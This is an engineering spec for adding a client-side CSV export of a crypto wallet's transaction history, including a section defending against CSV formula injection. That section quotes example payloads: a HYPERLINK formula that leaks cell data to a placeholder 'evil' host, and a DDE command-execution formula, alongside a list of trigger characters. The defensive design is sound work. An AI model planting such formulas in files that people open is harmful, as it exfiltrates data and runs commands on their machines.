# Spec — Export transaction history (CSV) — Opus 4.8

> Implementation spec for GitHub issue #20 ("Export transaction history (CSV)").
> Scope: a **client-side transform of already-fetched `Transaction[]`** — no
> service-layer (interface/mock/real) change. A pure serializer in `lib/ui`, a
> sibling download helper, and a button in the Transactions `PageHeader` action.

---

## 0. Verified ground truth (file:line)

- `lib/types/index.ts:47` — `Transaction = { id, hash, type, amount: {atomic:number},
  address, timestamp (ISO string), blockHeight, confirmations, paymentId?, message?,
  outgoing? }`. `TransactionType` (`lib/types/index.ts:39`) =
  `receive | send | deposit | withdrawal | fusion | miner | message`.
- `lib/utils.ts:19` `CCX_ATOMIC_UNITS = 10 ** COIN_UNIT_PLACES`; `:22`
  `CCX_PRECISION_DECIMAL_DISPLAY = COIN_UNIT_PLACES`; `:32` `ccxToNumber(amount) =
  amount.atomic / CCX_ATOMIC_UNITS`; `:40` `formatCcx(amount, decimals=2,
  trimTrailingZeros=false)` — **note: `formatCcx` appends the display ticker via
  `getDisplayTicker()`** (`lib/utils.ts:50`), so it is NOT suitable for a numeric CSV
  column. `COIN_UNIT_PLACES` comes from `@/lib/config/config`.
- `lib/wallet-core/mappers.ts` — `resolveUiTransactionType(tx)` returns `"message"` for
  message-in/out else `tx.type`; `isUiMessageOut(tx)` is true for outgoing message
  envelopes. The page computes the displayed sign in `formatSignedAmount`
  (`transactions-page-client.tsx`): `sign = effectiveType === "message" &&
  isUiMessageOut(tx) ? "−" : transactionMeta[effectiveType].sign`. The per-type sign
  table: `receive +`, `send −`, `deposit +`, `withdrawal +`, `fusion −`, `miner +`,
  `message +` (overridden to `−` when message-out).
- `app/(wallet)/wallet/transactions/transactions-page-client.tsx` — `const { data = [] }
  = useTransactions();` then `filtered` = `data` after **tab filter** (`All / Received /
  Sent / Deposits / Withdrawals / Messages` via `transactionMatchesTab`) + **search**
  (`transactionMatchesTab` + substring over `address|hash|type|paymentId|message|
  formatCcx(amount)`) + **sort desc by timestamp**. `<PageHeader title="Transaction
  History" subtitle="…" />` is currently rendered with **no `action`** — that is our
  insertion point.
- `components/wallet/common.tsx:21` — `PageHeader({ title, subtitle, action?, badge? })`;
  `action` is rendered on the right of the header flex row. So we pass our button as
  `action={…}`.
- `lib/ui/download-json-file.ts` — Blob + object-URL + temporary anchor + `revokeObjectURL`
  pattern, plus `sanitizeBackupFilename`. Mirror this exactly for CSV.
- `components/ui/button` exists (`Button` imported in several wallet pages); lucide is the
  icon set (`Download` icon available, not yet imported anywhere).
- Tests: vitest unit tests live in `tests/` (jsdom); existing `tests/download-json-file.test.ts`
  is the template. Playwright config (`playwright.config.ts`): `testDir ./e2e`, port `3100`,
  `webServer` runs `NEXT_PUBLIC_USE_MOCK=true npm run dev`, single chromium project,
  `timeout 30_000`. Existing specs: `e2e/golden-path.spec.ts`, `e2e/view-only-mode.spec.ts`.

---

## 1. Files to create / change

| File | Change |
| --- | --- |
| `lib/ui/transactions-csv.ts` | **NEW.** Pure serializer: `transactionsToCsv(rows, opts?) → string`, plus helpers `csvField`, `escapeCsvField`, `sanitizeCsvField`, `csvFilename`. No DOM, no React, no I/O. |
| `lib/ui/download-csv-file.ts` | **NEW.** `downloadCsvFile(filename, csvText)` — Blob+anchor mirror of `download-json-file.ts`, `type: "text/csv;charset=utf-8"`. |
| `app/(wallet)/wallet/transactions/transactions-page-client.tsx` | **EDIT.** Add `Download` to the lucide import, import `Button`, the serializer + downloader, and render an export button in the `PageHeader action` slot. Wire it to the already-computed `filtered` array. |
| `lib/ui/wallet-copy.ts` | **EDIT (small).** Add export-button label + a11y/toast strings (`exportCsvButton`, `exportCsvEmpty`). Keep mock/real identical (tx data is public in both). |
| `tests/transactions-csv.test.ts` | **NEW.** Unit tests for the pure serializer. |
| `e2e/export-transactions-csv.spec.ts` | **NEW.** Playwright `waitForEvent("download")` test. |

Rationale for splitting serializer vs downloader: the brief and `coding-style.md`
(many small files, pure functions, testable) — the serializer is a string→string pure
function with zero DOM, the downloader is the only impure (browser) piece.

---

## 2. CSV correctness — RFC 4180

`transactionsToCsv` MUST produce RFC 4180-compliant output:

1. **Header row first.** Exactly one header line, same field order as data rows
   (§3).
2. **Field quoting.** A field is wrapped in double quotes **iff** it contains a
   comma `,`, a double quote `"`, CR `\r`, or LF `\n` (RFC 4180 §2.6). To keep the
   output deterministic and injection-safe, this spec **quotes every field
   unconditionally** — RFC 4180 explicitly permits always-quoting (§2.5 "Each field
   may or may not be enclosed in double quotes"), it sidesteps the "does this field
   need quoting?" branch, and it means a leading neutralizing apostrophe (§4) is
   always inside quotes. (If a reviewer prefers minimal quoting, the conditional
   form is a one-line swap; always-quote is the safer default for a security-sensitive
   export.)
3. **Quote escaping.** Embedded `"` is escaped by **doubling** it: `a"b` → `"a""b"`
   (RFC 4180 §2.7). This is the only in-field escape; backslashes are literal.
4. **Line endings = CRLF (`\r\n`)** between records and after the header (RFC 4180
   §2.1). Do **not** emit a trailing CRLF after the last record (Excel tolerates it,
   but omitting it avoids a phantom empty row in stricter parsers). The serializer
   `join("\r\n")`s the rows.
5. **UTF-8 BOM.** Prepend `﻿` to the returned string. Without it, Excel on
   Windows interprets the file as the legacy ANSI code page and mangles any non-ASCII
   (message bodies, addresses are ASCII but messages are free-form Unicode). The BOM
   lives in the serializer output so unit tests assert it and the downloader stays
   dumb. `text/csv;charset=utf-8` on the Blob reinforces this for browsers/`fetch`.
6. **Encoding.** JS strings are UTF-16 internally; the `Blob` constructor encodes to
   UTF-8. No manual transcoding needed.

### Serializer shape (illustrative, not final code)

```ts
const CRLF = "\r\n";
const BOM = "﻿";

function escapeCsvField(raw: string): string {
  // RFC 4180 §2.7 — double embedded quotes, then wrap.
  return `"${raw.replace(/"/g, '""')}"`;
}

function csvField(raw: string): string {
  return escapeCsvField(sanitizeCsvField(raw)); // sanitize (§4) BEFORE quoting
}

export function transactionsToCsv(rows: readonly Transaction[]): string {
  const header = CSV_COLUMNS.map((c) => csvField(c.header)).join(",");
  const lines = rows.map((tx) => CSV_COLUMNS.map((c) => csvField(c.value(tx))).join(","));
  return BOM + [header, ...lines].join(CRLF);
}
```

Header row is produced even when `rows` is empty (header-only CSV) — but the UI
prevents export of an empty list (§6), so this is a defensive property the unit
tests pin, not a user-reachable path.

---

## 3. CSV / formula injection — CRITICAL

This is the single most important correctness item for a **wallet** export.
Addresses, payment IDs, and especially **message bodies** are
**attacker-influenced** (a counterparty chooses what message text to send you), and
a CSV opened in Excel / Google Sheets / LibreOffice will **evaluate** a field that
begins with a formula trigger.

### Threat
A cell whose first character is `=`, `+`, `-`, `@`, Tab (`\t`), or CR (`\r`) is
treated as a formula by spreadsheet apps. Example malicious message body:
`=HYPERLINK("http://evil/?leak="&A1,"click me")` or `=cmd|'/c calc'!A1` (DDE). When
the victim opens the exported CSV, the formula executes/exfiltrates. OWASP "CSV
Injection" (a.k.a. Formula Injection) is the reference.

### Mitigation (defense in depth)
`sanitizeCsvField(value)` runs on **every** field **before** quoting:

1. **Coerce to string.** `null`/`undefined` → `""`.
2. **Strip control chars** that some apps treat as separators / smuggling vectors
   except those RFC quoting already protects: remove NUL and other C0 controls; we
   keep `\n` inside quoted fields only if a column legitimately allows multiline —
   for this export we **collapse `\r` and `\n` in free-text fields to spaces** so no
   message body can inject a record break or a leading-CR formula. (Hash/address/
   paymentId are single-line by construction.)
3. **Neutralize leading formula triggers.** If, after trimming leading whitespace,
   the first character is one of `= + - @ \t \r` (plus a couple of Unicode lookalikes
   apps honor: `	`, ``, and the `＋`/`＝` fullwidth `+`/`=` are
   nice-to-have), **prefix the field with a single apostrophe `'`**. The apostrophe
   is the conventional spreadsheet "treat as text" guard and is stripped on display
   by Excel/Sheets. Apply the guard to the **raw** leading char even if preceded by
   whitespace, because Excel strips leading spaces before parsing.

```ts
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;
function sanitizeCsvField(value: unknown): string {
  let s = value == null ? "" : String(value);
  s = s.replace(/[ --]/g, ""); // strip C0 except \t \n \r
  s = s.replace(/[\r\n]+/g, " ");                                  // no record-break smuggling
  if (FORMULA_TRIGGERS.test(s.replace(/^\s+/, ""))) s = `'${s}`;   // neutralize formula
  return s;
}
```

Order matters: **sanitize → escape-quote**. The apostrophe and any literal `"` are
both inside the final quoted field.

### Why not just rely on quoting?
RFC quoting protects the *parser* (CSV structure) but does **nothing** against the
*spreadsheet formula engine* — `"=1+1"` still evaluates after the quotes are
stripped. The apostrophe guard is the only thing that defuses the formula. Both are
required.

### Caveat to document (open question, §7)
The apostrophe prefix is cosmetic-lossy: a value that *legitimately* starts with `-`
(e.g. we never emit signed amounts as `-x`, see §3-amount below — we use a separate
`direction` column and an unsigned-or-signed-without-leading-minus convention) will
show a leading `'` in a text editor. We accept this; correctness/safety beats
byte-purity for a wallet. Numeric amount handling is chosen (§4) so the amount column
does **not** start with `-` (avoiding both the formula guard firing on every send and
a confusing apostrophe on numbers).

---

## 4. Columns / shape

One row per `Transaction`. Column order (left→right), all values are pre-sanitized
strings:

| # | Header | Source | Format |
| --- | --- | --- | --- |
| 1 | `Date (UTC)` | `tx.timestamp` | **ISO 8601 UTC**: `tx.timestamp` is already an ISO string (`mapCoreTransaction` emits `new Date(ts*1000).toISOString()`). Emit it verbatim, e.g. `2026-06-16T04:21:09.000Z`. ISO is locale-stable, sorts lexically, and round-trips. |
| 2 | `Type` | `resolveUiTransactionType(tx)` | The **displayed** type (`receive/send/deposit/withdrawal/fusion/miner/message`) — matches what the user sees in the table, including message reclassification. Not raw `tx.type`. |
| 3 | `Direction` | derived | `in` or `out`. `out` when displayed sign is `−` (send, fusion, or message-out); else `in`. Computed by the same rule as `formatSignedAmount`. Gives a spreadsheet-filterable column without overloading the amount sign. |
| 4 | `Amount (CCX)` | `tx.amount.atomic` | **Unsigned decimal CCX** at full precision: `ccxToNumber(tx.amount).toFixed(CCX_PRECISION_DECIMAL_DISPLAY)` — full `COIN_UNIT_PLACES` precision (not the 2-dp display rounding), plain number, **no thousands separators**, **no ticker suffix** (do NOT use `formatCcx`, which appends `getDisplayTicker()` and groups digits → unparseable as a number). Unsigned so the cell never starts with `-` (formula-trigger + reconciles with the `Direction` column). Spreadsheets parse it as a number. |
| 5 | `Amount (atomic)` | `tx.amount.atomic` | Raw integer atomic units — lossless, lets power users re-derive without float concerns. `String(tx.amount.atomic)`. |
| 6 | `Address` | `tx.address` | As stored. Note: for `send` rows the mapper sets `address = ""` (no recipient retained); for message-out it is the remote address. Empty is fine → empty quoted field. Attacker-influenced → sanitized. |
| 7 | `Payment ID` | `tx.paymentId ?? ""` | Hex string, attacker-influenced → sanitized. |
| 8 | `Tx Hash` | `tx.hash` | Full hash (not truncated). |
| 9 | `Block Height` | `tx.blockHeight` | `String(tx.blockHeight)`; `0` means pending — see column 11. |
| 10 | `Confirmations` | `tx.confirmations` | `String(tx.confirmations)`. |
| 11 | `Status` | derived | `Pending` when `confirmations < 10` else `Confirmed` (mirrors `getTransactionStatus` in the page). Cheap, human-useful. |
| 12 | `Message` | `tx.message ?? ""` | Free-text, **highest-risk** field for injection → fully sanitized (§3). Newlines collapsed to spaces. |

Notes / decisions:
- **Signed vs unsigned amount.** We keep `Amount (CCX)` unsigned and express
  send/receive via the explicit `Direction` column. Reason: a leading `-` is a CSV
  formula trigger (would force the apostrophe guard on every outgoing tx, making the
  number a text cell) and Excel renders `-x` ambiguously vs a formula. An explicit
  enum column is cleaner and filterable. (Alternative considered: signed amount with
  the guard — rejected; turns numeric column into text.)
- **Timestamp: ISO-UTC, not local.** Deterministic across machines, matches the
  stored value, no `Intl` locale dependence in a pure function. The table shows a
  localized "medium/short" string for humans; the export favors machine-parseable.
- **Type: displayed, not raw.** Users expect the CSV to match the on-screen tab/label
  taxonomy (e.g. a message-out shows as `message`, not `send`).
- Columns are defined as a single `CSV_COLUMNS` array of `{ header, value(tx) }` so
  header and row generation cannot drift and tests can assert the column set.

---

## 5. Filtered vs all — recommendation

**Export the current filtered/searched view (the `filtered` array), and label the
button/feedback so the user knows the scope.** Justification:

- WYSIWYG: the user has already narrowed to "Sent in March containing 'invoice'"; the
  button should export *that*. Exporting the full `data` would surprise them and is
  the more dangerous default (dumps everything regardless of the active filter).
- `filtered` is **already computed** in the component (tab + search + sorted desc) —
  zero extra logic, and the sort order carries into the CSV (newest first), which is
  the sensible default.
- An "export all" is trivially reachable: the user clicks the `All` tab and clears
  search, which makes `filtered === data`. So the filtered-view default loses no
  capability.

**Phase-1 (this spec): single button = export current view.** Document an optional
follow-up (§7) to offer a dropdown ("Export current view" / "Export all
transactions") if users ask — but do not build it now (YAGNI; keeps the diff small).
Edge: when a filter yields zero rows the button is disabled (§6), so you cannot export
a header-only CSV from a non-empty wallet by accident.

---

## 6. UX

- **Placement:** `PageHeader action` slot (`components/wallet/common.tsx:21`
  renders `action` right-aligned in the header row). Replace the current
  `<PageHeader title="Transaction History" subtitle="…" />` with one that passes
  `action={<ExportCsvButton … />}`.
- **Control:** shadcn `Button` (`@/components/ui/button`), `variant="outline"`,
  `size="sm"`, with the lucide `Download` icon (`<Download className="size-4" />`) +
  text label. Matches the muted-secondary-action look used elsewhere.
- **Label / a11y:** visible label `Export CSV`; `aria-label="Export transactions as
  CSV"`. Strings live in `lib/ui/wallet-copy.ts` (`exportCsvButton: "Export CSV"`),
  identical in mock and real (tx data is public in both modes — no secret leakage,
  per the brief).
- **Empty / disabled:** `disabled={filtered.length === 0}`. With nothing to export the
  button is non-interactive (and an empty filtered view already shows the
  `EmptyState`). Optionally show a tooltip/`title` "No transactions to export" when
  disabled. No toast needed for the happy path; a `console`-level guard in the handler
  re-checks `length === 0` and returns (defense in depth, never throws to the user).
- **Filename:** `conceal-transactions-YYYY-MM-DD.csv`, date = **local** day of export
  (user expectation: "the file I downloaded today"). Build with
  `csvFilename(new Date())` in the serializer module (pure, injectable date for tests):
  `` `conceal-transactions-${y}-${mm}-${dd}.csv` `` using zero-padded local
  `getFullYear/getMonth+1/getDate`. Keep it a separate pure helper so it is unit-tested
  without touching the DOM.
- **Handler (in the client component):**
  ```ts
  function handleExportCsv() {
    if (filtered.length === 0) return;
    downloadCsvFile(csvFilename(new Date()), transactionsToCsv(filtered));
  }
  ```
  Synchronous, no async/await, no loading state needed (serialization of a few
  thousand rows is sub-millisecond). `downloadCsvFile` throws if `window` is undefined
  (SSR guard, mirrors `downloadJsonFile`) but the button only renders client-side
  (`"use client"`).
- **Immutability:** serializer takes `readonly Transaction[]`, never mutates; the
  component passes `filtered` (already a fresh array from `useMemo`).

---

## 7. Test plan

### Unit — `tests/transactions-csv.test.ts` (vitest, pure, no jsdom needed)
Test the serializer in isolation (its whole value is being a pure function).

1. **Header row** — first line (after stripping BOM) equals the exact
   comma-joined, quoted `CSV_COLUMNS` headers in order.
2. **BOM present** — output starts with `﻿`.
3. **CRLF** — records are separated by `\r\n`; no trailing `\r\n`; header is on its
   own CRLF-terminated line; assert exact `split("\r\n").length === rows + 1`.
4. **Quote escaping** — a field containing `"` (e.g. a crafted message `he said "hi"`)
   produces `"he said ""hi"""`.
5. **Comma / embedded separators** — a message with `a,b` stays one field (wrapped in
   quotes), parser sees one column.
6. **Newline collapse** — a message with `\n`/`\r\n` becomes a single line (no extra
   record); assert record count unchanged.
7. **Formula injection (the critical battery)** — for each trigger char build a
   message/address/paymentId starting with `=`, `+`, `-`, `@`, `\t`, `\r`, and a
   leading-space variant (`"   =cmd"`), assert the emitted field starts with `'`
   (apostrophe) and the trigger is neutralized. Include a realistic
   `=HYPERLINK(...)` and a DDE `=cmd|...` payload.
8. **Amount formatting** — `ccxToNumber` round-trip: `{atomic: 12345678}` →
   `Amount (CCX)` cell is the full-precision unsigned decimal (no ticker, no
   thousands grouping), `Amount (atomic)` is `"12345678"`.
9. **Direction / Type** — a message-out fixture (`outgoing:true`, envelope amount)
   yields `Type=message`, `Direction=out`; a `receive` yields `in`; a `fusion`/`send`
   yield `out`.
10. **Empty list** — `transactionsToCsv([])` returns BOM + header only (one line),
    no data rows.
11. **Optional fields** — `paymentId`/`message` undefined → empty quoted fields,
    not the literal `"undefined"`.
12. **`csvFilename(date)`** — deterministic, zero-padded:
    `csvFilename(new Date(2026,5,16)) === "conceal-transactions-2026-06-16.csv"`.

(Coverage target ≥80% per repo policy; the serializer module should hit ~100%.)
A light `download-csv-file` test can mirror `tests/download-json-file.test.ts`
(mock `URL.createObjectURL`/`revokeObjectURL`, assert anchor `download` attr +
Blob `type` `text/csv;charset=utf-8`) — but the bulk of value is in the serializer
tests above.

### E2E — `e2e/export-transactions-csv.spec.ts` (Playwright, mock mode, port 3100)
Mock build always has seeded transactions, so the button is enabled.

```ts
test("exports transactions to CSV", async ({ page }) => {
  await page.goto("/wallet/transactions");           // baseURL from config
  const exportBtn = page.getByRole("button", { name: /export transactions as csv/i });
  await expect(exportBtn).toBeEnabled();
  const [download] = await Promise.all([
    page.waitForEvent("download"),
    exportBtn.click(),
  ]);
  expect(download.suggestedFilename()).toMatch(/^conceal-transactions-\d{4}-\d{2}-\d{2}\.csv$/);
  const stream = await download.createReadStream();   // read bytes, assert BOM + header
  // read first chunk; expect it to start with ﻿ and contain "Date (UTC)","Type",...
});
```
Notes: use `Promise.all([waitForEvent('download'), click])` to avoid the race;
assert `suggestedFilename()` matches the pattern; optionally read the stream and
assert the BOM + header line. Keep it in its own spec so it doesn't perturb the
existing `golden-path`/`view-only-mode` flows. No `acceptDownloads` config change
needed (Chromium default accepts downloads in Playwright).

A second optional E2E assertion: type a search that matches nothing → button becomes
`disabled` (verifies the filtered/empty UX), then clear it → enabled again.

---

## 8. Risks / open questions

1. **Apostrophe guard is lossy on display.** Any field genuinely starting with a
   trigger char shows a leading `'` in some viewers. Accepted trade-off (safety >
   byte-purity). Documented in code comment. — *Decision: ship the guard.*
2. **Excel locale & decimal separator.** In locales where Excel uses `,` as the
   decimal separator, our `.`-decimal amount may be read as text. We intentionally
   also emit `Amount (atomic)` (integer, separator-agnostic) as the lossless source
   of truth, and the BOM + `en-US`-style decimal is the most portable default.
   *Open: should we offer a locale-aware decimal? Recommend no for v1.*
3. **`send` rows have empty `Address`.** The mapper drops the recipient on `send`
   (`address = ""`). The CSV reflects reality (empty cell); we do **not** fabricate a
   placeholder. Flagged so reviewers don't read it as a bug.
4. **Large lists / memory.** Serialization is in-memory string concat. For typical
   wallets (≤ tens of thousands of txs) this is fine. If a wallet ever has >100k txs,
   consider chunked Blob assembly — out of scope now (note for later).
5. **Filtered-only default could surprise a user expecting "everything."** Mitigated
   by the WYSIWYG argument + trivial "All tab + clear search" path. *Open follow-up:*
   add an "Export current view / Export all" split-button if users request it.
6. **`getDisplayTicker()` trap.** Anyone "reusing" `formatCcx` for the amount column
   would silently append the ticker and group digits, corrupting numeric parsing. The
   spec mandates `ccxToNumber(...).toFixed(...)` and the unit test (#8) pins this.
7. **Timestamp precision.** ISO string includes milliseconds (`.000Z`); harmless but
   could be trimmed to seconds if reviewers prefer. Low priority.
8. **No PII/secret leakage check needed** — tx data is public on-chain in both mock
   and real modes (per brief); no keys/mnemonic ever touch this path. Confirmed.
